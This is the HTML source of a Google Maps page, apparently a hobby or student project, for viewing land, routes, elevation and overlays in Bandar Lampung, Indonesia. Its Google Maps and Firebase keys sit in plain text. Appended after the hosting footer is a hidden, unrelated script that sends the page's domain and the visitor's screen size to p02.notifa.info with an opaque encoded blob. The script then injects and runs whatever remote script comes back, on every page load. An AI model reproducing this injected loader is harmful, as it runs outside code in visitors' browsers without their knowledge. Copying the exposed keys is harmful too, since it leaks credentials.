
<!DOCTYPE html>
<html>
<head>
    <!--main-->
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.cyan-light_blue.min.css" />
    <script defer src="https://code.getmdl.io/1.3.0/material.min.js"></script>

    <!--main-->
    <link rel="stylesheet" href="style.css"/>

    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
  	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
  	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <title>Land Price</title>

<!--START STYLE-->

    <style>

        #map{
            height: 500px;
            margin: 0px;
            padding: 0px;
            width: 100%;
        }

        #map-canvas{
            height: 500px;
            margin: 0px;
            padding: 0px;
            width: 100%;
        }
        #garis{
            width:100%;
            height:50px;
            background: -webkit-linear-gradient(left, #48c6ef, #6f86d6);
            background: linear-gradient(to right, #48c6ef, #6f86d6);
            font-family: 'Roboto', sans-serif;
        }
        .bgimg-1 {
            background-position: center;
            background-size: cover;
            background-image: url("/w3images/mac.jpg");
            min-height: 100%;
            }
        .w3-bar .w3-button {
            padding: 16px;
        }
        .keterangan{
          background-color: white;
        }

        .controls {
            margin-top: 10px;
            border: 1px solid transparent;
            border-radius: 2px 0 0 2px;
            box-sizing: border-box;
            -moz-box-sizing: border-box;
            height: 32px;
            outline: none;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
          }
        #searchInput {
              background-color: #fff;
              font-family: Roboto;
              font-size: 15px;
              font-weight: 300;
              margin-left: 12px;
              padding: 0 11px 0 13px;
              text-overflow: ellipsis;
              width: 50%;
          }
        #searchInput:focus {
              border-color: #4d90fe;
          }

        #time{
            font-size: 25px;
            font-weight: 300;
            text-overflow: ellipsis;
            font-family: 'Roboto', sans-serif;
            text-align: right;
            text-shadow: 1px 1px black
        }

        #floating-panel {
        position: absolute;
        top: 100px;
        left: 6.7%;
        z-index: 5;

        padding: 5px;
        text-align: center;
        font-family: 'Roboto','sans-serif';
        line-height: 30px;
        padding-left: 10px;
        }

        #floating-panel {
        margin-left: -100px;
        }
        .button-overlay{
        background-color: #59B000;
        border: none;
        border-radius: 5px;
        color: white;
        padding: 15px 20px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 13px;
        transition: 1s;
        }
        .button-overlay:hover{
          cursor:pointer;
          background-color: #70DE00;
          transition: 1s;
        }

      </style>

</head>

<!--START BODY-->

<body>
            <!--MAIN PAGE CONTENT -->

        <div class="w3-top">
              <div class="w3-bar w3-white w3-card" id="myNavbar">
              <div class="w3-right w3-hide-small">
                <a href="login.html" class="w3-bar-item w3-button">< BACK</a>
                <a href="guestsearchdata.html" class="w3-bar-item w3-button">SEARCH</a>
                <a href="guestelevation.html" class="w3-bar-item w3-button">ELEVATION</a>
                <a href="guestabout.html" class="w3-bar-item w3-button">ABOUT</a>
                <a href="guesthelp.html" class="w3-bar-item w3-button">HELP</a>
                <a href="guestteam.html" class="w3-bar-item w3-button"><i class="fa fa-user"></i> PROFILE</a>
                <a href="guestfilter.html" class="w3-bar-item w3-button"><i class="fa fa-th"></i> FILTER</a>
                <a href="guestrecommended.html" class="w3-bar-item w3-button"><i class="fa fa-usd"></i> RECOMMENDED</a>
                <a href="guestcontact.html" class="w3-bar-item w3-button"><i class="fa fa-envelope"></i> CONTACT</a>
              </div>

              <div id="garis"></div>
              <input id="searchInput" class="controls" type="text" placeholder="Find Location">

    <div id="floating-panel">
    <input type="button" value="Toggle Street View" class="button-overlay" onclick="toggleStreetViewBandarLampung();"></input>
    <input onclick="removeOverlay();" type=button value="Remove overlay" class="button-overlay">
    <input onclick="addOverlay();" type=button value="Restore overlay" class="button-overlay">
    </div>
    <div id="map"></div>
        <div><b>Start: </b>
            <select id="start">
                <option value="Kedaton, Kota Bandar Lampung, Lampung">Kedaton</option>
                <option value="Kemiling, Kota Bandar Lampung, Lampung">Kemiling</option>
                <option value="Panjang, Kota Bandar Lampung, Lampung">Panjang</option>
                <option value="Rajabasa, Kota Bandar Lampung, Lampung">Rajabasa</option>
                <option value="Sukabumi, Kota Bandar Lampung, Lampung">Sukabumi</option>
                <option value="Sukarame, Kota Bandar Lampung, Lampung">Sukarame</option>
                <option value="Tanjung Karang Barat, Kota Bandar Lampung, Lampung">Tanjung Karang Barat</option>
                <option value="Tanjung Karang Pusat, Kota Bandar Lampung, Lampung">Tanjung Karang Pusat</option>
                <option value="Tanjung Karang Timur, Kota Bandar Lampung, Lampung">Tanjung Karang Timur</option>
                <option value="Teluk Betung Barat, Kota Bandar Lampung, Lampung">Teluk Betung Barat</option>
                <option value="Teluk Betung Selatan, Kota Bandar Lampung, Lampung">Teluk Betung Selatan</option>
                <option value="Teluk Betung Utara, Kota Bandar Lampung, Lampung">Teluk Betung Utara</option>
            </select>
        <b>Destination: </b>
            <select id="end">
                <option value="Kedaton, Kota Bandar Lampung, Lampung">Kedaton</option>
                <option value="Kemiling, Kota Bandar Lampung, Lampung">Kemiling</option>
                <option value="Panjang, Kota Bandar Lampung, Lampung">Panjang</option>
                <option value="Rajabasa, Kota Bandar Lampung, Lampung">Rajabasa</option>
                <option value="Sukabumi, Kota Bandar Lampung, Lampung">Sukabumi</option>
                <option value="Sukarame, Kota Bandar Lampung, Lampung">Sukarame</option>
                <option value="Tanjung Karang Barat, Kota Bandar Lampung, Lampung">Tanjung Karang Barat</option>
                <option value="Tanjung Karang Pusat, Kota Bandar Lampung, Lampung">Tanjung Karang Pusat</option>
                <option value="Tanjung Karang Timur, Kota Bandar Lampung, Lampung">Tanjung Karang Timur</option>
                <option value="Teluk Betung Barat, Kota Bandar Lampung, Lampung">Teluk Betung Barat</option>
                <option value="Teluk Betung Selatan, Kota Bandar Lampung, Lampung">Teluk Betung Selatan</option>
                <option value="Teluk Betung Utara, Kota Bandar Lampung, Lampung">Teluk Betung Utara</option>
            </select>
        <b>Travel Mode: </b>
            <select id="mode">
                <option value="DRIVING">Driving</option>
                <option value="WALKING">Walking</option>
                <option value="TRANSIT">Transit</option>
            </select>
        </div>
    <div class="keterangan">
    <ul id="geoData">
            <li>Full Address: <span id="location"></span></li>
            <li>Country: <span id="country"></span></li>
            <li>Latitude: <span id="lat"></span></li>
            <li>Longitude: <span id="lon"></span></li>
        </ul>
  </div>
  <p id="time"></p>
    <script src="https://www.gstatic.com/firebasejs/5.0.1/firebase.js"></script>
    <script async defer src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBs7q7TznMg3Ai1LjVMjIpmsoJRwU_zSIY&callback=initMap"></script>
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBs7q7TznMg3Ai1LjVMjIpmsoJRwU_zSIY&libraries=places&callback=initMap" async defer></script>
    <script>
        var map = null;
        var center = { lat:-5.420572, lng:105.258255};
        var infowindow;
        var panorama;

        var config = {
            apiKey: "AIzaSyBvhYM6Un6QKcHQ12plVzohY73RzzyvIEQ",
            authDomain: "belajar-lagi-b3428.firebaseapp.com",
            databaseURL: "https://belajar-lagi-b3428.firebaseio.com",
            projectId: "belajar-lagi-b3428",
            storageBucket: "belajar-lagi-b3428.appspot.com",
            messagingSenderId: "1055657066334"
        };
        firebase.initializeApp(config);

        var db =  firebase.database();
        var dataRef = db.ref('bandar_lampung');

        dataRef.on('value', showData, showError);
        function showData(data){
            //console.log(data.val());
            map.data.addGeoJson(data.val());
            map.data.setStyle({
                fillColor:'grey',
                strokeWeight:0.4
            });
            map.data.addListener('click', function(event){
                infowindowcontent = event.feature.getProperty('KECAMATAN');
                infowindow.setContent(infowindowcontent);
                infowindow.setPosition(event.latLng);
                infowindow.open(map);
                map.addListener('click', function(event) {
                    displayLocationElevation(event.latLng, elevator, infowindow);
                });
            });
        }

        function showError(err){
            console.log(err);
        }

        var historicalOverlay;
        var historicalOverlay1;
        var historicalOverlay2;
        var historicalOverlay3;
        function initMap(){
            var bandarLampung = {lat:-5.422229, lng:105.258120};
            map = new google.maps.Map(document.getElementById('map'),{
                zoom: 12,
                center: center
            });
            var elevator = new google.maps.ElevationService;
            infowindow = new google.maps.InfoWindow();


            var infowindowpusat = new google.maps.InfoWindow();
            var contentStringpusat = '<h3>Central Of Bandar Lampung</h3><hr>'+
                                            '<h4>Welcome!</h4>';
            infowindowpusat.setContent(contentStringpusat);
            var marker = new google.maps.Marker({
                position:new google.maps.LatLng(-5.402599,105.264040)
                });
            marker.addListener('click',function(){
            infowindowpusat.open(map,marker);
            });

            map.addListener('click', function(event) {
                displayLocationElevation(event.latLng, elevator, infowindow);
            });
            marker.setMap(map);

            var input = document.getElementById('searchInput');
            map.controls[google.maps.ControlPosition.TOP_LEFT].push(input);

            var autocomplete = new google.maps.places.Autocomplete(input);
            autocomplete.bindTo('bounds', map);

            var infowindowlokasi = new google.maps.InfoWindow();
            var markerlokasi = new google.maps.Marker({
                map: map,
                anchorPoint: new google.maps.Point(0, -29)
            });

            autocomplete.addListener('place_changed', function() {
                infowindowlokasi.close();
                markerlokasi.setVisible(false);
                var place = autocomplete.getPlace();
                if (!place.geometry) {
                    window.alert("Autocomplete's returned place contains no geometry");
                    return;
                }

                // If the place has a geometry, then present it on a map.
                if (place.geometry.viewport) {
                    map.fitBounds(place.geometry.viewport);
                } else {
                    map.setCenter(place.geometry.location);
                    map.setZoom(17);
                }
                markerlokasi.setIcon(({
                    url: place.icon,
                    size: new google.maps.Size(71, 71),
                    origin: new google.maps.Point(0, 0),
                    anchor: new google.maps.Point(17, 34),
                    scaledSize: new google.maps.Size(35, 35)
                }));
                markerlokasi.setPosition(place.geometry.location);
                markerlokasi.setVisible(true);

                var address = '';
                if (place.address_components) {
                    address = [
                    (place.address_components[0] && place.address_components[0].short_name || ''),
                    (place.address_components[1] && place.address_components[1].short_name || ''),
                    (place.address_components[2] && place.address_components[2].short_name || '')
                    ].join(' ');
                }

                infowindowlokasi.setContent('<div><strong>' + place.name + '</strong><br>' + address);
                infowindowlokasi.open(map, markerlokasi);

                //Location details
                for (var i = 0; i < place.address_components.length; i++) {
                    if(place.address_components[i].types[0] == 'postal_code'){
                        document.getElementById('postal_code').innerHTML = place.address_components[i].long_name;
                    }
                    if(place.address_components[i].types[0] == 'country'){
                        document.getElementById('country').innerHTML = place.address_components[i].long_name;
                    }
                }
                document.getElementById('location').innerHTML = place.formatted_address;
                document.getElementById('lat').innerHTML = place.geometry.location.lat();
                document.getElementById('lon').innerHTML = place.geometry.location.lng();
            });

            markerlokasi.addListener('click',function(){
                    infowindowlokasi.open(map,markerlokasi);
                    });

            markerlokasi.addListener('rightclick',function(){
                    markerlokasi.setVisible(false);
                    infowindowlokasi.close();
                    });


            var directionsService = new google.maps.DirectionsService;
            var directionsDisplay = new google.maps.DirectionsRenderer;
            directionsDisplay.setMap(map);

            var onChangeHandler = function() {
                calculateAndDisplayRoute(directionsService, directionsDisplay)
                document.getElementById('mode').addEventListener('change', function() {
                calculateAndDisplayRoute(directionsService, directionsDisplay);
                });;
            };
            document.getElementById('start').addEventListener('change', onChangeHandler);
            document.getElementById('end').addEventListener('change', onChangeHandler);

            panorama = map.getStreetView();
            panorama.setPosition(bandarLampung);
            panorama.setPov(/** @type {google.maps.StreetViewPov} */({
            heading: 265,
            pitch: 0
            }));

            var imageBounds = new google.maps.LatLngBounds(
                new google.maps.LatLng(-5.491289, 105.012213),
                new google.maps.LatLng(-5.381920, 105.157438));

            historicalOverlay = new google.maps.GroundOverlay(
            'bandarlampung3.jpg',
            imageBounds);


            var imageBounds1 = new google.maps.LatLngBounds(
                new google.maps.LatLng(-5.372862, 105.012900),
                new google.maps.LatLng(-5.276463, 105.156409));

            historicalOverlay1 = new google.maps.GroundOverlay(
            'bandarlampung4.jpg',
            imageBounds1);

            var imageBounds2 = new google.maps.LatLngBounds(
                new google.maps.LatLng(-5.269529, 105.012582),
                new google.maps.LatLng(-5.148777, 105.157221));

            historicalOverlay2 = new google.maps.GroundOverlay(
            'bandarlampung5.jpg',
            imageBounds2);

            var imageBounds3 = new google.maps.LatLngBounds(
                new google.maps.LatLng(-5.268092, 105.157509),
                new google.maps.LatLng(-5.149352, 105.215249));

            historicalOverlay3 = new google.maps.GroundOverlay(
            'bandarlampung6.jpg',
            imageBounds3);
        }

        function addOverlay() {
            historicalOverlay.setMap(map);
            historicalOverlay1.setMap(map);
            historicalOverlay2.setMap(map);
            historicalOverlay3.setMap(map);
        }

        function removeOverlay() {
            historicalOverlay.setMap(null);
            historicalOverlay1.setMap(null);
            historicalOverlay2.setMap(null);
            historicalOverlay3.setMap(null);
        }

        function calculateAndDisplayRoute(directionsService, directionsDisplay) {
            var selectedMode = document.getElementById('mode').value;
            directionsService.route({
            origin: document.getElementById('start').value,
            destination: document.getElementById('end').value,
            travelMode: google.maps.TravelMode[selectedMode]
            },
            function(response, status) {
                if (status === 'OK') {
                    directionsDisplay.setDirections(response);
                } else {
                window.alert('There is no routing' + status);
                }
            });
        }

        var display=setInterval(function(){Time()},0);
            function Time(){
                var date=new Date();
                var time=date.toLocaleTimeString();
                document.getElementById("time").innerHTML=time;
            }

         function displayLocationElevation(location, elevator, infowindow) {
            elevator.getElevationForLocations({
                'locations': [location]
            }, function(results, status) {
                infowindow.setPosition(location);
                if (status === 'OK') {
                    if (results[0]) {
                    infowindow.setContent('The elevation at this point <br>is ' +
                        results[0].elevation + ' meters.');
                    } else {
                    infowindow.setContent('No results found');
                    }
                } else {
                    infowindow.setContent('Elevation service failed due to: ' + status);
                }
            });
        }

        function toggleStreetViewBandarLampung() {
            var toggle = panorama.getVisible();
            if (toggle == false) {
                panorama.setVisible(true);
            } else {
                panorama.setVisible(false);
            }
        }
        </script>
        <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
        <script src="index.js"></script>
<div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;'><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_medium=website_sigprogress&amp;utm_content=footer_img"><img src="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"  alt="www.000webhost.com"></a></div><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mbJ87GaCqAf588tsm6kc95OlcIARAxYM%2bfTIwwt7aKRnT%2fe9DE5PGy0juQ%2b3cAecNohmYeiJ2T7MR9r1bbHrWLFiTMeH8sUGFNnxczdqmISvnpzKQ%2fnuu5ROqGn7fiCer0l7QBhQWn0DIX9Y4bh2alipxQIM2vrazLlVWWl0hLHWF9FUjU2sPa7kTGouAln7tfI96zC6bf9FyKRBWkmPMRKtaFBvWCf4EFCINAml%2b4yQ8Tb9vkW6ydupRjt8co8LhSBFefCxQBjFN1fdP0HoPBWPMwGTNMnBPIztlJGSnMH0fOO%2fEdw42aHFJHxndhBJeAK62M65HPcmrUzvqYwcWouAbh1x4eheGNpf1DySEDvKNXyiT%2b1ml4Wos8ak04GStTCnuJVbhWy49ejjfsJAfkmCdej%2fVNgj%2b%2fLHAXgoZBLic%2fT0oIZgzAcwZws0%2bkeqaNDS%2bV2Wu6%2fuLxDEUyrUBQoXLYigKNmqJZckAvdrJXW9v4SXAhxW1sd%2bhj1dz7Y6WHtBLXpA3s5VmVKfoVOPteVxv7sk%2fx3jIWvlMEITPrwQ5O2soGQ8i8Z6vETb208YwKkmSMZYN0kjhV1wjeF17p%2bPnia6%2frLWlpHogwzv5xQ0%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
